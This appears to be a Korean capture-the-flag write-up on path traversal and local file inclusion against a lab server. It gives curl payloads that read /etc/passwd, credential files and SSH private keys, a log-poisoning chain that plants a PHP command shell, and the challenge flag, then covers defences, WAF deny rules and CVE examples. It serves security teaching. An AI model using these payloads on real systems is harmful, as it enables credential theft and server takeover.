# Breach #11: 디렉토리 조작 (경로 순회 공격)

## 취약점 개요

**취약점 유형**: 경로 순회 (Path Traversal), 디렉토리 순회, 로컬 파일 포함 (LFI)
**위험도**: 치명적
**공격 벡터**: URL 파라미터 조작

`page` 쿼리 파라미터가 경로 순회 공격에 취약하여, 공격자가 상대 경로 시퀀스(`../`)를 사용하여 웹 디렉토리 외부의 파일에 접근할 수 있습니다. 이는 민감한 시스템 파일 노출로 이어질 수 있습니다.

## 취약점 발견 과정

### 1단계: 취약한 파라미터 식별
**URL**: `http://192.168.64.2/?page=...`

애플리케이션이 `page` 파라미터를 사용하여 어떤 파일을 포함/렌더링할지 결정합니다.

### 2단계: 기본 경로 순회 테스트

**테스트 1: 단일 디렉토리 순회**
```bash
curl 'http://192.168.64.2/?page=../'
```

**응답**: `<script>alert('Wtf ?');</script>`

![첫 번째 테스트 - Wtf?](./images/01-first-test-wtf.png)

파라미터가 취약함을 확인 - 서버가 경로 순회 시도를 처리합니다.

### 3단계: 순회 깊이 증가

**테스트 2: 다중 디렉토리 순회**
```bash
curl 'http://192.168.64.2/?page=../../'
```

**응답**: `<script>alert('Wrong..');</script>`

![잘못된 깊이](./images/02-wrong-depth.png)

애플리케이션이 더 깊은 순회 시도를 인식합니다.

### 4단계: 올바른 깊이 찾기

**테스트 3: 깊은 순회**
```bash
curl 'http://192.168.64.2/?page=../../../../../../../../../'
```

**응답**: `<script>alert('You can DO it !!! :]');</script>`

![올바른 깊이 도달](./images/03-correct-depth.png)

루트 디렉토리 또는 적절한 깊이에 도달했음을 나타냅니다.

### 5단계: 민감한 시스템 파일 접근

**공격: `/etc/passwd` 읽기**
```bash
curl 'http://192.168.64.2/?page=../../../../../../../../../../etc/passwd'
```

**응답**:
```html
<script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script>
```

![플래그 획득](./images/04-flag-obtained.png)

**플래그 획득**: `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

## 취약점 상세 설명

### 경로 순회란?

경로 순회(디렉토리 순회라고도 함)는 공격자가 파일 경로 입력을 조작하여 서버의 임의 파일을 읽을 수 있는 웹 보안 취약점입니다.

### 취약한 코드 패턴

```php
<?php
// 취약한 코드
$page = $_GET['page'];
include($page . '.php');  // 검증 없음!
?>
```

**문제점**:
1. **입력 검증 없음**: 모든 사용자 입력을 직접 수락
2. **경로 살균 없음**: `../` 시퀀스를 제거하지 않음
3. **화이트리스트 없음**: 허용된 파일로 제한하지 않음
4. **직접 파일 포함**: 파일 작업에 사용자 입력을 직접 사용

### 공격 작동 방식

```
사용자 입력:          ../../../../../../../../../../etc/passwd
서버 해석:            /var/www/html/../../../../../../../../../../etc/passwd
해결됨:               /etc/passwd
결과:                 시스템 비밀번호 파일 읽기
```

### 왜 이것이 치명적인가?

#### 1. 민감한 파일 노출
- **시스템 파일**: `/etc/passwd`, `/etc/shadow` (읽기 가능한 경우)
- **설정 파일**: 데이터베이스 자격 증명, API 키
- **애플리케이션 파일**: 소스 코드, 설정
- **로그 파일**: 접근 로그, 오류 로그

#### 2. Linux의 일반적인 대상 파일
```
/etc/passwd                          - 사용자 계정 정보
/etc/shadow                          - 암호화된 비밀번호 해시 (접근 가능한 경우)
/etc/hosts                           - 호스트 이름 매핑
/etc/mysql/my.cnf                    - MySQL 설정
/var/www/.env                        - 환경 변수 (자격 증명)
/proc/self/environ                   - 현재 프로세스 환경
/var/log/apache2/access.log          - 웹 서버 로그
/home/user/.ssh/id_rsa               - SSH 개인 키
```

#### 3. Windows의 일반적인 대상 파일
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\inetpub\wwwroot\web.config
C:\Program Files\MySQL\my.ini
```

## 공격 시나리오

### 시나리오 1: 자격 증명 수집
```bash
# 애플리케이션 설정 읽기
curl 'http://192.168.64.2/?page=../../../../var/www/html/config.php'

# 데이터베이스 자격 증명 읽기
curl 'http://192.168.64.2/?page=../../../../etc/mysql/my.cnf'

# 환경 변수 파일 읽기
curl 'http://192.168.64.2/?page=../../../../var/www/.env'
```

**영향**: 데이터베이스 자격 증명, API 키 노출

### 시나리오 2: 소스 코드 노출
```bash
# 애플리케이션 소스 코드 읽기
curl 'http://192.168.64.2/?page=../../../../var/www/html/admin.php'

# 인증 로직 읽기
curl 'http://192.168.64.2/?page=../../../../var/www/html/includes/auth.php'

# 백업 파일 읽기
curl 'http://192.168.64.2/?page=../../../../var/www/html/config.php.bak'
```

**영향**: 비즈니스 로직 노출, 보안 결함 드러남

### 시나리오 3: 로그 파일 분석
```bash
# 접근 로그 읽기
curl 'http://192.168.64.2/?page=../../../../var/log/apache2/access.log'

# 오류 로그 읽기
curl 'http://192.168.64.2/?page=../../../../var/log/apache2/error.log'

# 애플리케이션 로그 읽기
curl 'http://192.168.64.2/?page=../../../../var/www/html/logs/app.log'
```

**영향**: 사용자 활동 추적, 시스템 정보 유출

### 시나리오 4: 원격 코드 실행 (고급)
로그 중독(Log Poisoning)과 결합하면:

**단계 1: User-Agent에 PHP 코드 삽입**
```bash
curl 'http://192.168.64.2/' \
     -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

**단계 2: 중독된 로그 파일 포함**
```bash
curl 'http://192.168.64.2/?page=../../../../var/log/apache2/access.log&cmd=whoami'
```

**영향**: 서버 완전 손상, 임의 명령 실행

### 시나리오 5: SSH 키 탈취
```bash
# SSH 개인 키 읽기
curl 'http://192.168.64.2/?page=../../../../home/www-data/.ssh/id_rsa'

# root 사용자 키
curl 'http://192.168.64.2/?page=../../../../root/.ssh/id_rsa'
```

**영향**: SSH 접근 권한 획득, 서버 제어

## 방어 방법

### 1. 입력 검증 및 살균

```php
<?php
function sanitizePath($path) {
    // null 바이트 제거
    $path = str_replace(chr(0), '', $path);

    // 경로 순회 시퀀스 제거
    $path = str_replace(['../', '..\\', '../', '..\\\\'], '', $path);

    // 절대 경로 제거
    $path = str_replace(['/', '\\'], '', $path);

    return $path;
}

$page = sanitizePath($_GET['page']);
?>
```

**주의**: 이 방법은 충분하지 않을 수 있습니다. 화이트리스트 방식이 더 안전합니다.

### 2. 화이트리스트 사용 (권장)

```php
<?php
// 허용된 페이지 정의
$allowed_pages = [
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
    'contact' => 'pages/contact.php',
    'products' => 'pages/products.php'
];

$page = $_GET['page'] ?? 'home';

if (isset($allowed_pages[$page])) {
    include($allowed_pages[$page]);
} else {
    // 404 페이지 표시
    http_response_code(404);
    include('pages/404.php');
}
?>
```

**장점**:
- 명시적으로 허용된 파일만 접근 가능
- 경로 순회 불가능
- 유지보수가 쉬움

### 3. Basename 함수 사용

```php
<?php
// 파일 이름만 추출, 디렉토리 구성 요소 제거
$page = basename($_GET['page']);
$file_path = 'pages/' . $page . '.php';

// 파일 존재 확인
if (file_exists($file_path)) {
    include($file_path);
} else {
    http_response_code(404);
    include('pages/404.php');
}
?>
```

### 4. 적절한 접근 제어 구현

```php
<?php
function isPathAllowed($path, $allowed_dir) {
    // 실제 경로 가져오기 (.. 및 심볼릭 링크 해결)
    $real_path = realpath($path);
    $real_allowed_dir = realpath($allowed_dir);

    // 경로가 허용된 디렉토리로 시작하는지 확인
    if ($real_path === false || $real_allowed_dir === false) {
        return false;
    }

    if (strpos($real_path, $real_allowed_dir) !== 0) {
        return false;
    }

    return true;
}

$page = $_GET['page'];
$file_path = 'pages/' . $page . '.php';

if (isPathAllowed($file_path, __DIR__ . '/pages/')) {
    include($file_path);
} else {
    http_response_code(403);
    die('접근이 거부되었습니다');
}
?>
```

### 5. Chroot 또는 컨테이너 사용

**Chroot Jail**:
```bash
# 애플리케이션을 특정 디렉토리로 제한
chroot /var/www/app /usr/bin/php index.php
```

**Docker 컨테이너**:
```dockerfile
FROM php:8.2-apache

# 애플리케이션 파일만
COPY ./app /var/www/html

# 시스템 파일 접근 불가
USER www-data

# 읽기 전용 파일 시스템
RUN chmod -R 555 /var/www/html
```

### 6. 웹 애플리케이션 방화벽 (WAF) 규칙

**ModSecurity 규칙**:
```apache
# 경로 순회 패턴 차단
SecRule ARGS "@contains ../" \
    "id:1,deny,status:403,msg:'Path traversal attempt'"

SecRule ARGS "@contains ..\\\" \
    "id:2,deny,status:403,msg:'Path traversal attempt'"

SecRule ARGS "@rx (?:etc\/\W*passwd)" \
    "id:3,deny,status:403,msg:'Sensitive file access attempt'"
```

**Nginx 규칙**:
```nginx
location / {
    # 경로 순회 시도 차단
    if ($args ~* "\.\./") {
        return 403;
    }

    if ($args ~* "etc/passwd") {
        return 403;
    }
}
```

### 7. 파일 시스템 권한 설정

```bash
# 웹 루트 권한 설정
chown -R www-data:www-data /var/www/html
chmod -R 755 /var/www/html

# 민감한 파일 보호
chmod 600 /etc/shadow
chmod 644 /etc/passwd

# 설정 파일 보호
chmod 400 /var/www/html/config.php
```

### 8. 로깅 및 모니터링

```php
<?php
function logPathTraversalAttempt($path, $ip) {
    $log_message = sprintf(
        "[%s] Path traversal attempt from %s: %s\n",
        date('Y-m-d H:i:s'),
        $ip,
        $path
    );

    error_log($log_message, 3, '/var/log/security.log');

    // 관리자에게 알림
    if (substr_count($path, '../') > 3) {
        mail(
            'admin@example.com',
            'Security Alert: Path Traversal',
            "Multiple path traversal attempts detected from $ip"
        );
    }
}

// 의심스러운 패턴 감지
if (strpos($_GET['page'], '../') !== false) {
    logPathTraversalAttempt($_GET['page'], $_SERVER['REMOTE_ADDR']);
    http_response_code(403);
    die('접근이 거부되었습니다');
}
?>
```

## 실제 영향 사례

### 유사 취약점 사례

#### 1. Apache 2.4.49 (CVE-2021-41773)
**취약점**: 경로 순회로 인한 RCE
**영향**: 서버의 모든 파일 읽기 및 원격 코드 실행 가능
**해결**: Apache 2.4.51로 업데이트

#### 2. WordPress 플러그인
**취약점**: 수많은 플러그인의 LFI 취약점
**영향**: 사이트 소스 코드, 데이터베이스 자격 증명 노출
**사례**:
- File Manager 플러그인 (CVE-2020-25213)
- WP File Manager (700만+ 설치)

#### 3. Fortinet SSL-VPN (CVE-2018-13379)
**취약점**: 경로 순회로 인한 자격 증명 노출
**영향**: 전 세계 수만 대의 VPN 서버 손상
**결과**: 기업 네트워크 침투, 랜섬웨어 배포

#### 4. Microsoft IIS
**취약점**: Unicode 인코딩을 통한 경로 순회
**영향**: 웹 서버 소스 코드 노출
**패턴**: `%c0%af` = `/`, `%c1%1c` = `\`

### 결과

- **데이터 유출**: 고객 데이터, 자격 증명, 소스 코드 노출
- **컴플라이언스 위반**: GDPR, HIPAA, PCI-DSS 위반
- **시스템 손상**: 로그 중독을 통한 RCE, 임의 파일 읽기
- **평판 손상**: 고객 신뢰 상실
- **재정적 손실**: 벌금, 소송, 복구 비용

## 보안 모범 사례

### OWASP 권장사항

1. **사용자 입력을 절대 신뢰하지 말 것**: 모든 사용자 입력은 잠재적으로 악의적
2. **블랙리스트보다 화이트리스트**: 차단할 것이 아닌 허용할 것을 정의
3. **최소 권한 원칙**: 최소한의 필요 권한으로 실행
4. **심층 방어**: 여러 보안 계층
5. **정기적인 보안 감사**: 경로 순회 취약점 테스트

### 구현 체크리스트

#### 필수 항목
- [ ] 화이트리스트 기반 페이지 라우팅 구현
- [ ] 모든 파일 경로 입력 살균
- [ ] `basename()`을 사용하여 디렉토리 구성 요소 제거
- [ ] `realpath()`와 포함 검사로 경로 검증
- [ ] 적절한 파일 시스템 권한 설정
- [ ] 디렉토리 리스팅 비활성화

#### 보안 강화
- [ ] Chroot 또는 컨테이너에서 애플리케이션 실행
- [ ] 경로 순회에 대한 WAF 규칙 구현
- [ ] 순회 시도에 대한 로그 및 모니터링
- [ ] 정기적인 침투 테스트
- [ ] 보안 헤더 구현 (`X-Content-Type-Options`, `X-Frame-Options`)

#### 개발 프로세스
- [ ] 코드 리뷰에서 파일 작업 확인
- [ ] 자동화된 보안 스캔 통합
- [ ] 개발자 보안 교육
- [ ] 안전한 코딩 가이드라인 수립

## 참고 자료

- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [PortSwigger - File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Top 10 2021 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

## 플래그

```
b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```
